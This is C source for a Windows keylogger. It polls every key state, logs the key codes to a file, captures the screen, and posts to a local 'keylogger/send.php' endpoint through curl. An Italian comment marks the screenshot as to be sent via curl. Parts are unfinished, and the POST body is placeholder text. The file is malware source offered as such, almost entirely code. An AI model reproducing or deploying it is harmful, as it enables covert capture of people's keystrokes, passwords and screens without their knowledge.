#include <stdio.h>
#include <time.h>
#include "curl/curl.h"

unsigned int buffer[1024];
unsigned int ptr;

void ScreenCapture(int width, int height)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	
	// convertire in PNG e inviare via curl
	
	DeleteObject(hBmp);
}

int curl()
{
  CURL *curl;
  CURLcode res;

  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {
    /* First set the URL that is about to receive our POST. This URL can
       just as well be a https:// URL if that is what should receive the
       data. */
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:81/keylogger/send.php");
    /* Now specify the POST data */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");

    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  
  return 0;	
}



			
void saveLog()
{
	FILE *log;
	unsigned int p;
	
	log = fopen("log", "a+");
	for (p = 0; p < ptr; p++)
	{
		fprintf(log, "%02X,", buffer[p]);
	}
	
	fclose(log);
}

DWORD WINAPI ThreadFunc(void *data)
{
	saveLog();
}

void saveKey(unsigned int keyCode)
{
	buffer[ptr++] = keyCode;
}

void keyloggerLoop()
{
	unsigned int currKeyStatus[256];
	unsigned int prevKeyStatus[256];
	unsigned int prevKey, currKey;
	unsigned int k;
	ptr = 0;

	for (k = 0; k < 256; k++)
	{
		currKeyStatus[k] = 0;
	}
			
	while(1)
	{
		for (k = 0; k < 256; k++)
		{
			prevKeyStatus[k] = currKeyStatus[k];
		}

		for (k = 0; k < 256; k++)
		{			
			currKeyStatus[k] = GetAsyncKeyState(k);		
		}
		
		for (k = 0; k < 256; k++)
		{
			if(currKeyStatus[k])
			{
				saveKey(k);
			}
		}
	
		if(ptr > 20)
		{
			saveLog();
			ptr = 0;
		}
		
		//HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
		
		usleep(1000);
	}
}

int main(void)
{
	ScreenCapture(800, 600);
	curl();
	keyloggerLoop();
	return 0;
}
